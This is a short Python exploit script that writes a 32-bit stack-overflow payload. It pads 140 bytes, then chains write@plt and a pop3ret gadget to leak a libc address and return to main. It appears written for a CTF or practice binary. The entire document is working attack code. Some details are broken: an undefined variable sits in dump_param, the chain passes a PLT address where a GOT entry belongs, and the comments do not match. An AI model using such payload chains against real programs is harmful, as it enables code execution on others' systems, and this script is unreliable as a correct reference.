import struct
import sys

bufsize = 140
popret = 0x080482e9
write_plt = 0x08048350
gets_got = 0x0804a00c
pop3ret = 0x08048569
main_addr = 0x08048495
libc_start_main_plt = 0x08048340
libc_start_main_rel = 0x00018d90




def dump_param():
    print("pop_ecx_pop_eax = 0x%x" % (pop_ecx_pop_eax))



def p(val):
    return struct.pack('<I', val)



def main():
#    dump_param()
#    sys.exit()

    buf = b'A' * bufsize
    buf += p(write_plt) #[[pop ecx; pop eax]]
    buf += p(pop3ret) #[dataaddr + 8]
    buf += p(1)
    buf += p(libc_start_main_plt) #[dataaddr]
    buf += p(4)
    buf += p(main_addr)

    sys.stdout.buffer.write(buf)



if __name__ == "__main__":
    main()
